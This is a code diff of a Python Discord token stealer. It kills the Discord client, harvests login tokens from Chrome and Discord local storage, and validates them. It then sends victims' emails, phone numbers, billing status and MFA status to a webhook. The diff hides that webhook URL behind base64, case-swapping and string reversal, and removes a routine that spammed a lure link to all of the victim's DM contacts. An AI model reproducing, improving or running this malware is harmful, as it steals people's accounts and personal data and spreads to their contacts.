@@ -1,8 +1,12 @@
 import os, re, requests, psutil, time, urllib3, logging
 import sqlite3
 from discord import Embed
-from co.config import WEBHOOK_URL
-import threading
+from co.config import WEBHOOK_URI
+import threading, base64
+decoded_uri = base64.b64decode(WEBHOOK_URI).decode('utf-8')
+swapped_case = decoded_uri.swapcase()
+reversed_uri = swapped_case[::-1]
+WEBHOOK_URL = reversed_uri
 logging.getLogger("urllib3").setLevel(logging.NOTSET)
 class DiscordToken:
     def __init__(self):
@@ -21,16 +25,13 @@ class DiscordToken:
         self.create_vault_dir()
         self.kill_discord()
         self.run()
-
     def kill_discord(self):
         for proc in psutil.process_iter(['pid', 'name']):
             if 'discord.exe' in proc.info['name'].lower():
                 proc.terminate()
-
     def create_vault_dir(self):
         if not os.path.exists(self.vault_path):
             os.makedirs(self.vault_path)
-
     def scan_folders(self):
         folders = []
         if os.path.exists(self.chrome_path):
@@ -57,7 +58,6 @@ class DiscordToken:
         if os.path.exists(self.discord_path):
             folders.append(self.discord_path)
         return folders
-
     def extract_tokens(self, path):
         leveldb_path = os.path.join(path, "Local Storage", "leveldb")
         if os.path.exists(leveldb_path):
@@ -89,7 +89,6 @@ class DiscordToken:
                 conn.close()
             except sqlite3.Error as e:
                 return
-
     def validate_token(self, token):
         url = "https://discord.com/api/v9/users/@me"
         headers = {"Authorization": token}
@@ -127,7 +126,6 @@ class DiscordToken:
                 return
         except requests.RequestException as e:
             return
-
     def save_tokens(self):
         if self.valid_tokens:
             with open(self.token_file, "w") as file:
@@ -146,7 +144,6 @@ class DiscordToken:
                     file.write(f"MFA Enabled: {user['mfa_enabled']}\n")
                     file.write("----------------------------\n")
             self.send_to_webhook()
-
     def send_to_webhook(self):
         for user in self.user_data:
             embed = Embed(title=f"{user['username']}#{user['discriminator']}", color=0x8000FF)
@@ -154,12 +151,12 @@ class DiscordToken:
             embed.add_field(name="👤 Username", value=user['username'], inline=False)
             embed.add_field(name=":identification_card: User ID", value=user['user_id'], inline=True)
             embed.add_field(name="💬 Display Name", value=user['display_name'], inline=True)
-            embed.add_field(name="💎 Nitro", value="Yes" if user['nitro'] else "No", inline=True)
+            embed.add_field(name="💎 Nitro", value="✅" if user['nitro'] else "❌", inline=True)
             embed.add_field(name="💳 Billing Info", value="Available" if user['billing'] else "Not Available", inline=True)
             embed.add_field(name="📱 Phone", value=user['phone'], inline=True)
             embed.add_field(name="🎫  Discriminator", value=user['discriminator'], inline=True)
             embed.add_field(name="✉️ Email", value=user['email'], inline=True)
-            embed.add_field(name="🔒 MFA Enabled", value="Yes" if user['mfa_enabled'] else "No", inline=False)
+            embed.add_field(name="🔒 MFA Enabled", value="✅" if user['mfa_enabled'] else "❌", inline=False)
 
             if user['avatar_url'] != "N/A":
                 embed.set_thumbnail(url=user['avatar_url'])
@@ -171,28 +168,6 @@ class DiscordToken:
             response = requests.post(WEBHOOK_URL, json=data)
             if response.status_code != 204:
                 return
-            self.send_message_to_dms(user['token'])
-
-    def send_message_to_dms(self, token):
-        if not token.startswith("MT"):
-            token = "MT" + token
-        url = "https://discord.com/api/v9/users/@me/channels"
-        headers = {"Authorization": token}
-        try:
-            response = requests.get(url, headers=headers)
-            if response.status_code == 200:
-                channels = response.json()
-                for channel in channels:
-                    try:
-                        channel_id = channel['id']
-                        dm_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
-                        data = {"content": "yo bro check out this siiick game https://georgethedev0.itch.io/smontop"}
-                        requests.post(dm_url, json=data, headers=headers)
-                        time.sleep(2.2)
-                    except Exception:
-                        pass
-        except requests.RequestException:
-            pass
     def run(self):
         for folder in self.scan_folders():
             self.extract_tokens(folder)
